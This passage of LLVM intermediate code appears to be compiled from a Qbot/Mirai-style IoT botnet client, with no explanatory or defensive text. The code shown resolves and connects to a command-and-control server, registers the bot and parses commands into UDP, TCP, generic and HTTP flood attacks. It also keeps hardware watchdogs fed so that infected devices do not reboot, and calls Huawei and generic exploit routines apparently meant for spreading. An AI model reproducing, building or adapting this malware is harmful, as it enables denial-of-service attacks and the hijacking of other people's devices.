declare i32 @snprintf(i8*, i64, i8*, ...) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @resolve_http() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.hostent*, align 8
  %3 = alloca %struct.in_addr**, align 8
  %4 = alloca i32, align 4
  %5 = load i8*, i8** @c2_http_host, align 8
  %6 = call %struct.hostent* @gethostbyname(i8* %5)
  store %struct.hostent* %6, %struct.hostent** %2, align 8
  %7 = icmp eq %struct.hostent* %6, null
  br i1 %7, label %8, label %9

8:                                                ; preds = %0
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i64 0, i64 0)) #11
  store i32 1, i32* %1, align 4
  br label %35

9:                                                ; preds = %0
  %10 = load %struct.hostent*, %struct.hostent** %2, align 8
  %11 = getelementptr inbounds %struct.hostent, %struct.hostent* %10, i32 0, i32 4
  %12 = load i8**, i8*** %11, align 8
  %13 = bitcast i8** %12 to %struct.in_addr**
  store %struct.in_addr** %13, %struct.in_addr*** %3, align 8
  store i32 0, i32* %4, align 4
  br label %14

14:                                               ; preds = %31, %9
  %15 = load %struct.in_addr**, %struct.in_addr*** %3, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %15, i64 %17
  %19 = load %struct.in_addr*, %struct.in_addr** %18, align 8
  %20 = icmp ne %struct.in_addr* %19, null
  br i1 %20, label %21, label %34

21:                                               ; preds = %14
  %22 = load %struct.in_addr**, %struct.in_addr*** %3, align 8
  %23 = load i32, i32* %4, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %22, i64 %24
  %26 = load %struct.in_addr*, %struct.in_addr** %25, align 8
  %27 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %26, i32 0, i32 0
  %28 = load i32, i32* %27, align 4
  %29 = call i8* @inet_ntoa(i32 %28) #11
  %30 = call i8* @strcpy(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i64 0, i64 0), i8* %29) #11
  store i32 0, i32* %1, align 4
  br label %35

31:                                               ; No predecessors!
  %32 = load i32, i32* %4, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %4, align 4
  br label %14, !llvm.loop !20

34:                                               ; preds = %14
  store i32 1, i32* %1, align 4
  br label %35

35:                                               ; preds = %34, %21, %8
  %36 = load i32, i32* %1, align 4
  ret i32 %36
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #2

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @watchdog_maintain() #0 {
  %1 = alloca [7 x i32], align 16
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = bitcast [7 x i32]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %4, i8 0, i64 28, i1 false)
  store i32 1, i32* %2, align 4
  store i32 0, i32* %3, align 4
  call void @table_unlock_val(i8 zeroext 1)
  call void @table_unlock_val(i8 zeroext 2)
  call void @table_unlock_val(i8 zeroext 3)
  call void @table_unlock_val(i8 zeroext 4)
  call void @table_unlock_val(i8 zeroext 5)
  call void @table_unlock_val(i8 zeroext 6)
  call void @table_unlock_val(i8 zeroext 7)
  %5 = call i8* @table_retrieve_val(i32 1, i32* null)
  %6 = call i32 (i8*, i32, ...) @open(i8* %5, i32 2)
  %7 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  store i32 %6, i32* %7, align 16
  %8 = icmp ne i32 %6, -1
  br i1 %8, label %39, label %9

9:                                                ; preds = %0
  %10 = call i8* @table_retrieve_val(i32 2, i32* null)
  %11 = call i32 (i8*, i32, ...) @open(i8* %10, i32 2)
  %12 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  store i32 %11, i32* %12, align 4
  %13 = icmp ne i32 %11, -1
  br i1 %13, label %39, label %14

14:                                               ; preds = %9
  %15 = call i8* @table_retrieve_val(i32 3, i32* null)
  %16 = call i32 (i8*, i32, ...) @open(i8* %15, i32 2)
  %17 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  store i32 %16, i32* %17, align 8
  %18 = icmp ne i32 %16, -1
  br i1 %18, label %39, label %19

19:                                               ; preds = %14
  %20 = call i8* @table_retrieve_val(i32 4, i32* null)
  %21 = call i32 (i8*, i32, ...) @open(i8* %20, i32 2)
  %22 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  store i32 %21, i32* %22, align 4
  %23 = icmp ne i32 %21, -1
  br i1 %23, label %39, label %24

24:                                               ; preds = %19
  %25 = call i8* @table_retrieve_val(i32 5, i32* null)
  %26 = call i32 (i8*, i32, ...) @open(i8* %25, i32 2)
  %27 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  store i32 %26, i32* %27, align 16
  %28 = icmp ne i32 %26, -1
  br i1 %28, label %39, label %29

29:                                               ; preds = %24
  %30 = call i8* @table_retrieve_val(i32 6, i32* null)
  %31 = call i32 (i8*, i32, ...) @open(i8* %30, i32 2)
  %32 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  store i32 %31, i32* %32, align 4
  %33 = icmp ne i32 %31, -1
  br i1 %33, label %39, label %34

34:                                               ; preds = %29
  %35 = call i8* @table_retrieve_val(i32 7, i32* null)
  %36 = call i32 (i8*, i32, ...) @open(i8* %35, i32 2)
  %37 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  store i32 %36, i32* %37, align 8
  %38 = icmp ne i32 %36, -1
  br i1 %38, label %39, label %61

39:                                               ; preds = %34, %29, %24, %19, %14, %9, %0
  store i32 1, i32* %3, align 4
  %40 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  %41 = load i32, i32* %40, align 16
  %42 = call i32 (i32, i64, ...) @ioctl(i32 %41, i64 2147768068, i32* %2) #11
  %43 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  %44 = load i32, i32* %43, align 4
  %45 = call i32 (i32, i64, ...) @ioctl(i32 %44, i64 2147768068, i32* %2) #11
  %46 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  %47 = load i32, i32* %46, align 8
  %48 = call i32 (i32, i64, ...) @ioctl(i32 %47, i64 2147768068, i32* %2) #11
  %49 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  %50 = load i32, i32* %49, align 4
  %51 = call i32 (i32, i64, ...) @ioctl(i32 %50, i64 2147768068, i32* %2) #11
  %52 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  %53 = load i32, i32* %52, align 16
  %54 = call i32 (i32, i64, ...) @ioctl(i32 %53, i64 2147768068, i32* %2) #11
  %55 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  %56 = load i32, i32* %55, align 4
  %57 = call i32 (i32, i64, ...) @ioctl(i32 %56, i64 2147768068, i32* %2) #11
  %58 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  %59 = load i32, i32* %58, align 8
  %60 = call i32 (i32, i64, ...) @ioctl(i32 %59, i64 2147768068, i32* %2) #11
  br label %61

61:                                               ; preds = %39, %34
  %62 = load i32, i32* %3, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %64, label %88

64:                                               ; preds = %61
  br label %65

65:                                               ; preds = %64, %65
  %66 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  %67 = load i32, i32* %66, align 16
  %68 = call i32 (i32, i64, ...) @ioctl(i32 %67, i64 2147768069, i32 0) #11
  %69 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = call i32 (i32, i64, ...) @ioctl(i32 %70, i64 2147768069, i32 0) #11
  %72 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  %73 = load i32, i32* %72, align 8
  %74 = call i32 (i32, i64, ...) @ioctl(i32 %73, i64 2147768069, i32 0) #11
  %75 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  %76 = load i32, i32* %75, align 4
  %77 = call i32 (i32, i64, ...) @ioctl(i32 %76, i64 2147768069, i32 0) #11
  %78 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  %79 = load i32, i32* %78, align 16
  %80 = call i32 (i32, i64, ...) @ioctl(i32 %79, i64 2147768069, i32 0) #11
  %81 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  %82 = load i32, i32* %81, align 4
  %83 = call i32 (i32, i64, ...) @ioctl(i32 %82, i64 2147768069, i32 0) #11
  %84 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  %85 = load i32, i32* %84, align 8
  %86 = call i32 (i32, i64, ...) @ioctl(i32 %85, i64 2147768069, i32 0) #11
  %87 = call i32 @sleep(i32 3)
  br label %65

88:                                               ; preds = %61
  call void @table_lock_val(i8 zeroext 1)
  call void @table_lock_val(i8 zeroext 2)
  call void @table_lock_val(i8 zeroext 3)
  call void @table_lock_val(i8 zeroext 4)
  call void @table_lock_val(i8 zeroext 5)
  call void @table_lock_val(i8 zeroext 6)
  call void @table_lock_val(i8 zeroext 7)
  ret void
}

declare void @table_unlock_val(i8 zeroext) #6

declare i32 @open(i8*, i32, ...) #6

declare i8* @table_retrieve_val(i32, i32*) #6

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #2

declare i32 @sleep(i32) #6

declare void @table_lock_val(i8 zeroext) #6

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @proc_cmd(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %5 = load i8**, i8*** %4, align 8
  %6 = getelementptr inbounds i8*, i8** %5, i64 0
  %7 = load i8*, i8** %6, align 8
  %8 = call i8* @strstr(i8* %7, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.56, i64 0, i64 0)) #12
  %9 = icmp ne i8* %8, null
  br i1 %9, label %28, label %10

10:                                               ; preds = %2
  %11 = load i8**, i8*** %4, align 8
  %12 = getelementptr inbounds i8*, i8** %11, i64 0
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strstr(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0)) #12
  %15 = icmp ne i8* %14, null
  br i1 %15, label %28, label %16

16:                                               ; preds = %10
  %17 = load i8**, i8*** %4, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i8* @strstr(i8* %19, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.58, i64 0, i64 0)) #12
  %21 = icmp ne i8* %20, null
  br i1 %21, label %28, label %22

22:                                               ; preds = %16
  %23 = load i8**, i8*** %4, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i8* @strstr(i8* %25, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.59, i64 0, i64 0)) #12
  %27 = icmp ne i8* %26, null
  br i1 %27, label %28, label %29

28:                                               ; preds = %22, %16, %10, %2
  call void @stop_attack()
  br label %29

29:                                               ; preds = %28, %22
  %30 = load i8**, i8*** %4, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i8* @strstr(i8* %32, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.60, i64 0, i64 0)) #12
  %34 = icmp ne i8* %33, null
  br i1 %34, label %41, label %35

35:                                               ; preds = %29
  %36 = load i8**, i8*** %4, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 0
  %38 = load i8*, i8** %37, align 8
  %39 = call i8* @strstr(i8* %38, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.61, i64 0, i64 0)) #12
  %40 = icmp ne i8* %39, null
  br i1 %40, label %41, label %68

41:                                               ; preds = %35, %29
  %42 = load i32, i32* %3, align 4
  %43 = icmp slt i32 %42, 5
  br i1 %43, label %47, label %44

44:                                               ; preds = %41
  %45 = load i32, i32* %3, align 4
  %46 = icmp sgt i32 %45, 5
  br i1 %46, label %47, label %48

47:                                               ; preds = %44, %41
  br label %195

48:                                               ; preds = %44
  %49 = call i32 @listFork()
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

51:                                               ; preds = %48
  br label %195

52:                                               ; preds = %48
  %53 = load i8**, i8*** %4, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 1
  %55 = load i8*, i8** %54, align 8
  %56 = load i8**, i8*** %4, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 2
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @atoi(i8* %58) #12
  %60 = load i8**, i8*** %4, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 3
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @atoi(i8* %62) #12
  %64 = load i8**, i8*** %4, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 4
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @atoi(i8* %66) #12
  call void @udpflood(i8* %55, i32 %59, i32 %63, i32 %67)
  br label %68

68:                                               ; preds = %52, %35
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 0
  %71 = load i8*, i8** %70, align 8
  %72 = call i8* @strstr(i8* %71, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.62, i64 0, i64 0)) #12
  %73 = icmp ne i8* %72, null
  br i1 %73, label %80, label %74

74:                                               ; preds = %68
  %75 = load i8**, i8*** %4, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 0
  %77 = load i8*, i8** %76, align 8
  %78 = call i8* @strstr(i8* %77, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i64 0, i64 0)) #12
  %79 = icmp ne i8* %78, null
  br i1 %79, label %80, label %110

80:                                               ; preds = %74, %68
  %81 = load i32, i32* %3, align 4
  %82 = icmp slt i32 %81, 6
  br i1 %82, label %86, label %83

83:                                               ; preds = %80
  %84 = load i32, i32* %3, align 4
  %85 = icmp sgt i32 %84, 6
  br i1 %85, label %86, label %87

86:                                               ; preds = %83, %80
  br label %195

87:                                               ; preds = %83
  %88 = call i32 @listFork()
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %91

90:                                               ; preds = %87
  br label %195

91:                                               ; preds = %87
  %92 = load i8**, i8*** %4, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 1
  %94 = load i8*, i8** %93, align 8
  %95 = load i8**, i8*** %4, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 2
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @atoi(i8* %97) #12
  %99 = load i8**, i8*** %4, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 3
  %101 = load i8*, i8** %100, align 8
  %102 = call i32 @atoi(i8* %101) #12
  %103 = load i8**, i8*** %4, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 4
  %105 = load i8*, i8** %104, align 8
  %106 = call i32 @atoi(i8* %105) #12
  %107 = load i8**, i8*** %4, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 5
  %109 = load i8*, i8** %108, align 8
  call void @tcpflood(i8* %94, i32 %98, i32 %102, i32 %106, i8* %109)
  br label %110

110:                                              ; preds = %91, %74
  %111 = load i8**, i8*** %4, align 8
  %112 = getelementptr inbounds i8*, i8** %111, i64 0
  %113 = load i8*, i8** %112, align 8
  %114 = call i8* @strstr(i8* %113, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i64 0, i64 0)) #12
  %115 = icmp ne i8* %114, null
  br i1 %115, label %122, label %116

116:                                              ; preds = %110
  %117 = load i8**, i8*** %4, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 0
  %119 = load i8*, i8** %118, align 8
  %120 = call i8* @strstr(i8* %119, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i64 0, i64 0)) #12
  %121 = icmp ne i8* %120, null
  br i1 %121, label %122, label %149

122:                                              ; preds = %116, %110
  %123 = load i32, i32* %3, align 4
  %124 = icmp slt i32 %123, 5
  br i1 %124, label %128, label %125

125:                                              ; preds = %122
  %126 = load i32, i32* %3, align 4
  %127 = icmp sgt i32 %126, 5
  br i1 %127, label %128, label %129

128:                                              ; preds = %125, %122
  br label %195

129:                                              ; preds = %125
  %130 = call i32 @listFork()
  %131 = icmp ne i32 %130, 0
  br i1 %131, label %132, label %133

132:                                              ; preds = %129
  br label %195

133:                                              ; preds = %129
  %134 = load i8**, i8*** %4, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 1
  %136 = load i8*, i8** %135, align 8
  %137 = load i8**, i8*** %4, align 8
  %138 = getelementptr inbounds i8*, i8** %137, i64 2
  %139 = load i8*, i8** %138, align 8
  %140 = call i32 @atoi(i8* %139) #12
  %141 = load i8**, i8*** %4, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 3
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @atoi(i8* %143) #12
  %145 = load i8**, i8*** %4, align 8
  %146 = getelementptr inbounds i8*, i8** %145, i64 4
  %147 = load i8*, i8** %146, align 8
  %148 = call i32 @atoi(i8* %147) #12
  call void @stdflood(i8* %136, i32 %140, i32 %144, i32 %148)
  br label %149

149:                                              ; preds = %133, %116
  %150 = load i8**, i8*** %4, align 8
  %151 = getelementptr inbounds i8*, i8** %150, i64 0
  %152 = load i8*, i8** %151, align 8
  %153 = call i8* @strstr(i8* %152, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.66, i64 0, i64 0)) #12
  %154 = icmp ne i8* %153, null
  br i1 %154, label %161, label %155

155:                                              ; preds = %149
  %156 = load i8**, i8*** %4, align 8
  %157 = getelementptr inbounds i8*, i8** %156, i64 0
  %158 = load i8*, i8** %157, align 8
  %159 = call i8* @strstr(i8* %158, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i64 0, i64 0)) #12
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %195

161:                                              ; preds = %155, %149
  %162 = load i32, i32* %3, align 4
  %163 = icmp slt i32 %162, 7
  br i1 %163, label %167, label %164

164:                                              ; preds = %161
  %165 = load i32, i32* %3, align 4
  %166 = icmp sgt i32 %165, 7
  br i1 %166, label %167, label %168

167:                                              ; preds = %164, %161
  br label %195

168:                                              ; preds = %164
  %169 = call i32 @listFork()
  %170 = icmp ne i32 %169, 0
  br i1 %170, label %171, label %172

171:                                              ; preds = %168
  br label %195

172:                                              ; preds = %168
  %173 = load i8**, i8*** %4, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 1
  %175 = load i8*, i8** %174, align 8
  %176 = load i8**, i8*** %4, align 8
  %177 = getelementptr inbounds i8*, i8** %176, i64 2
  %178 = load i8*, i8** %177, align 8
  %179 = load i8**, i8*** %4, align 8
  %180 = getelementptr inbounds i8*, i8** %179, i64 3
  %181 = load i8*, i8** %180, align 8
  %182 = call i32 @atoi(i8* %181) #12
  %183 = trunc i32 %182 to i16
  %184 = load i8**, i8*** %4, align 8
  %185 = getelementptr inbounds i8*, i8** %184, i64 4
  %186 = load i8*, i8** %185, align 8
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 5
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @atoi(i8* %189) #12
  %191 = load i8**, i8*** %4, align 8
  %192 = getelementptr inbounds i8*, i8** %191, i64 6
  %193 = load i8*, i8** %192, align 8
  %194 = call i32 @atoi(i8* %193) #12
  call void @httpflood(i8* %175, i8* %178, i16 zeroext %183, i8* %186, i32 %190, i32 %194)
  br label %195

195:                                              ; preds = %47, %51, %86, %90, %128, %132, %167, %171, %172, %155
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @parse_buffer(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [11 x i8*], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %7 = bitcast [11 x i8*]* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %7, i8 0, i64 88, i1 false)
  %8 = load i8*, i8** %2, align 8
  %9 = call i8* @strtok(i8* %8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i64 0, i64 0)) #11
  store i8* %9, i8** %6, align 8
  br label %10

10:                                               ; preds = %18, %1
  %11 = load i8*, i8** %6, align 8
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %16

13:                                               ; preds = %10
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 10
  br label %16

16:                                               ; preds = %13, %10
  %17 = phi i1 [ false, %10 ], [ %15, %13 ]
  br i1 %17, label %18, label %35

18:                                               ; preds = %16
  %19 = load i8*, i8** %6, align 8
  %20 = call i64 @strlen(i8* %19) #12
  %21 = add i64 %20, 1
  %22 = call noalias align 16 i8* @malloc(i64 %21) #11
  %23 = load i32, i32* %4, align 4
  %24 = add nsw i32 %23, 1
  store i32 %24, i32* %4, align 4
  %25 = sext i32 %23 to i64
  %26 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %25
  store i8* %22, i8** %26, align 8
  %27 = load i32, i32* %4, align 4
  %28 = sub nsw i32 %27, 1
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = load i8*, i8** %6, align 8
  %33 = call i8* @strcpy(i8* %31, i8* %32) #11
  %34 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i64 0, i64 0)) #11
  store i8* %34, i8** %6, align 8
  br label %10, !llvm.loop !21

35:                                               ; preds = %16
  %36 = load i32, i32* %4, align 4
  %37 = icmp sgt i32 %36, 0
  br i1 %37, label %38, label %41

38:                                               ; preds = %35
  %39 = load i32, i32* %4, align 4
  %40 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 0
  call void @proc_cmd(i32 %39, i8** %40)
  br label %41

41:                                               ; preds = %38, %35
  store i32 0, i32* %3, align 4
  br label %42

42:                                               ; preds = %51, %41
  %43 = load i32, i32* %3, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp slt i32 %43, %44
  br i1 %45, label %46, label %54

46:                                               ; preds = %42
  %47 = load i32, i32* %3, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %48
  %50 = load i8*, i8** %49, align 8
  call void @free(i8* %50) #11
  br label %51

51:                                               ; preds = %46
  %52 = load i32, i32* %3, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %3, align 4
  br label %42, !llvm.loop !22

54:                                               ; preds = %42
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @qbot() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [11 x i8*], align 16
  %4 = call i32 @fork() #11
  %5 = icmp sgt i32 %4, 0
  br i1 %5, label %6, label %7

6:                                                ; preds = %0
  br label %75

7:                                                ; preds = %0
  store i32 0, i32* %2, align 4
  %8 = bitcast [11 x i8*]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 88, i1 false)
  %9 = call i32 @resolve_http()
  br label %10

10:                                               ; preds = %40, %7
  %11 = load i32, i32* @C2, align 4
  %12 = load i32, i32* @C2, align 4
  %13 = call i32 (i32, i32, ...) @fcntl(i32 %12, i32 3, i32 0)
  %14 = or i32 %13, 2048
  %15 = call i32 (i32, i32, ...) @fcntl(i32 %11, i32 4, i32 %14)
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #11
  store i32 %16, i32* @C2, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %22

18:                                               ; preds = %10
  %19 = load i32, i32* @C2, align 4
  %20 = call i32 @close(i32 %19)
  %21 = call i32 @close(i32 0)
  br label %22

22:                                               ; preds = %18, %10
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 0), align 4
  %23 = call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i64 0, i64 0)) #11
  store i32 %23, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 2, i32 0), align 4
  %24 = load i32, i32* @c2_bot_port, align 4
  %25 = trunc i32 %24 to i16
  %26 = call zeroext i16 @htons(i16 zeroext %25) #10
  store i16 %26, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 1), align 2
  %27 = load i32, i32* @C2, align 4
  %28 = call i32 @connect(i32 %27, %struct.sockaddr* bitcast (%struct.sockaddr_in* @Socket to %struct.sockaddr*), i32 16)
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %30, label %47

30:                                               ; preds = %22
  %31 = load i32, i32* @retry, align 4
  %32 = icmp eq i32 %31, 3
  br i1 %32, label %33, label %37

33:                                               ; preds = %30
  %34 = load i32, i32* @C2, align 4
  %35 = call i32 @close(i32 %34)
  %36 = call i32 @close(i32 0)
  br label %46

37:                                               ; preds = %30
  %38 = load i32, i32* @tryagain, align 4
  %39 = icmp eq i32 %38, 1
  br i1 %39, label %40, label %45

40:                                               ; preds = %37
  %41 = load i32, i32* @C2, align 4
  %42 = call i32 @close(i32 %41)
  %43 = load i32, i32* @retry, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* @retry, align 4
  br label %10

45:                                               ; preds = %37
  br label %46

46:                                               ; preds = %45, %33
  br label %75

47:                                               ; preds = %22
  call void @registerme(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.69, i64 0, i64 0))
  br label %48

48:                                               ; preds = %71, %47
  %49 = load i32, i32* @C2, align 4
  %50 = call i64 @read(i32 %49, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i64 1024)
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* @buffer, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %72

53:                                               ; preds = %48
  %54 = load i32, i32* @buffer, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1024 x i8], [1024 x i8]* @buf, i64 0, i64 %55
  store i8 0, i8* %56, align 1
  %57 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.70, i64 0, i64 0)) #12
  %58 = icmp ne i8* %57, null
  br i1 %58, label %59, label %62

59:                                               ; preds = %53
  %60 = load i32, i32* @C2, align 4
  %61 = call i64 @write(i32 %60, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i64 0, i64 0), i64 6)
  br label %62

62:                                               ; preds = %59, %53
  %63 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.72, i64 0, i64 0)) #12
  %64 = icmp ne i8* %63, null
  br i1 %64, label %65, label %66

65:                                               ; preds = %62
  br label %72

66:                                               ; preds = %62
  %67 = load i8*, i8** @trigger, align 8
  %68 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i8* %67) #12
  %69 = icmp ne i8* %68, null
  br i1 %69, label %70, label %71

70:                                               ; preds = %66
  call void @parse_buffer(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0))
  br label %71

71:                                               ; preds = %70, %66
  br label %48, !llvm.loop !23

72:                                               ; preds = %65, %48
  %73 = load i32, i32* @C2, align 4
  %74 = call i32 @close(i32 %73)
  call void @exit(i32 0) #14
  unreachable

75:                                               ; preds = %6, %46
  ret void
}

declare i32 @fcntl(i32, i32, ...) #6

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  call void @qbot()
  call void @table_init()
  call void @watchdog_maintain()
  %7 = call i32 @rand() #11
  %8 = srem i32 %7, 1
  store i32 %8, i32* %6, align 4
  %9 = load i32, i32* %6, align 4
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %11, label %12

11:                                               ; preds = %2
  call void (...) @huawei_init()
  br label %17

12:                                               ; preds = %2
  %13 = load i32, i32* %6, align 4
  %14 = icmp eq i32 %13, 1
  br i1 %14, label %15, label %16

15:                                               ; preds = %12
  call void (...) @exploit_init()
  br label %16

16:                                               ; preds = %15, %12
  br label %17

17:                                               ; preds = %16, %11
  %18 = load i32, i32* %3, align 4
  ret i32 %18
}

declare void @table_init() #6

declare void @huawei_init(...) #6

declare void @exploit_init(...) #6

